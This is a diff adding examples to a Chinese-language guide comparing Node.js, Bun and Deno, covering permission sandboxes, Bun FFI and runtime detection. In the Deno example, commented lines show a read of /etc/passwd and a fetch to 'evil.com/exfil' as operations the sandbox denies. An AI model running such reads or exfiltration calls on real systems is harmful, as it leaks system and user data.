@@ -142,6 +142,113 @@ deno run --allow-net wintercg-compat.ts
 wrangler dev
 ```
 
+### Deno 权限沙盒实战
+
+```typescript
+// Deno: 最小权限运行（对比 Node.js 默认完全访问）
+
+// 启动命令：
+// deno run --allow-net=0.0.0.0:8000,api.example.com --allow-read=./data --allow-env=PORT,API_KEY app.ts
+
+const PORT = Deno.env.get('PORT') || '8000';
+
+// 文件系统访问被限制在 ./data 目录
+const data = await Deno.readTextFile('./data/config.json');
+
+// 网络访问被限制在指定域名
+const apiRes = await fetch('https://api.example.com/users');
+
+// 以下操作将被 Deno 权限系统拒绝（未授权）：
+// await Deno.readTextFile('/etc/passwd');     // ❌ --allow-read 未包含
+// await fetch('https://evil.com/exfil');       // ❌ --allow-net 未包含
+// await Deno.writeTextFile('/tmp/pwned', '');  // ❌ --allow-write 未授权
+
+Deno.serve({ port: Number(PORT) }, (req) => {
+  return Response.json({ ok: true, data: JSON.parse(data) });
+});
+```
+
+### Bun FFI (Foreign Function Interface) 示例
+
+```typescript
+// Bun 可以直接调用原生库，无需 C++ 插件
+import { dlopen, FFIType, ptr } from 'bun:ffi';
+
+// 调用系统 libc 的 strlen
+const path = process.platform === 'darwin' ? '/usr/lib/libSystem.dylib' : 'libc.so.6';
+const libc = dlopen(path, {
+  strlen: {
+    args: [FFIType.cstring],
+    returns: FFIType.size_t,
+  },
+});
+
+const str = Buffer.from('Hello from Bun FFI\0', 'utf8');
+const length = libc.symbols.strlen(ptr(str));
+console.log(`Length: ${length}`); // 19
+
+// 高性能场景：图像处理、加密、压缩
+// 对比 Node.js: 需要 node-gyp / N-API 编译，Bun FFI 零编译
+```
+
+### Node.js 实验性权限模型
+
+```typescript
+// Node.js v20+ 实验性权限模型（向 Deno 靠拢）
+// 启动：node --experimental-permission --allow-fs-read=* --allow-fs-write=/tmp app.js
+
+import { permission } from 'node:process';
+
+// 检查当前权限状态
+console.log('File read:', permission.has('fs.read'));
+console.log('File write:', permission.has('fs.write', '/tmp'));
+console.log('Child process:', permission.has('child'));
+
+// 尝试无权限操作将抛出 ERR_ACCESS_DENIED
+// import { spawn } from 'node:child_process';
+// spawn('ls'); // ❌ ERR_ACCESS_DENIED (without --allow-child-process)
+```
+
+### 运行时特性检测与 Polyfill
+
+```typescript
+// runtime-compat.ts — 运行时特性检测与适配
+
+const runtime = {
+  isNode: typeof process !== 'undefined' && !!process.versions?.node,
+  isBun: typeof Bun !== 'undefined',
+  isDeno: typeof Deno !== 'undefined',
+  isEdge: typeof EdgeRuntime !== 'undefined' || typeof WebSocketPair !== 'undefined',
+};
+
+// 统一的文件读取适配器
+async function readFile(path: string): Promise<string> {
+  if (runtime.isDeno) {
+    return Deno.readTextFile(path);
+  }
+  if (runtime.isBun) {
+    return Bun.file(path).text();
+  }
+  if (runtime.isNode) {
+    const { readFile } = await import('node:fs/promises');
+    return readFile(path, 'utf-8');
+  }
+  throw new Error('File system not available in this runtime');
+}
+
+// 统一的环境变量读取
+function getEnv(key: string): string | undefined {
+  if (runtime.isDeno) return Deno.env.get(key);
+  if (runtime.isNode || runtime.isBun) return process.env[key];
+  return undefined;
+}
+
+// 统一的 crypto 随机数（所有 WinterCG 运行时支持）
+function randomBytes(length: number): Uint8Array {
+  return crypto.getRandomValues(new Uint8Array(length));
+}
+```
+
 ---
 
 ## 选型决策矩阵
@@ -162,13 +269,24 @@ wrangler dev
 ## 权威参考链接
 
 - [Node.js 官方文档](https://nodejs.org/docs/latest/api/)
+- [Node.js Permissions (Experimental)](https://nodejs.org/api/permissions.html)
 - [Bun 官方文档](https://bun.sh/docs)
+- [Bun FFI Documentation](https://bun.sh/docs/api/ffi)
 - [Deno 官方文档](https://docs.deno.com/)
+- [Deno Permissions](https://docs.deno.com/runtime/fundamentals/security/)
+- [Deno Deploy](https://deno.com/deploy)
 - [WinterCG 标准规范](https://wintercg.org/)
+- [WinterCG Minimum Common API](https://common-min-api.proposal.wintercg.org/)
 - [Cloudflare Workers 运行时 API](https://developers.cloudflare.com/workers/runtime-apis/)
 - [Vercel Edge Runtime 文档](https://vercel.com/docs/functions/runtimes/edge-runtime)
 - [TechEmpower Benchmarks](https://www.techempower.com/benchmarks/)
 - [JS Runtime Shootout 2026](https://github.com/anon/js-runtime-shootout)
+- [State of JS 2024](https://2024.stateofjs.com/)
+- [Node.js Test Runner](https://nodejs.org/api/test.html)
+- [Bun Test Runner](https://bun.sh/docs/cli/test)
+- [Deno Testing](https://docs.deno.com/runtime/fundamentals/testing/)
+- [Deno vs Node.js Comparison](https://docs.deno.com/runtime/fundamentals/node/)
+- [ECMA-262 Specification](https://tc39.es/ecma262/)
 
 ---
 
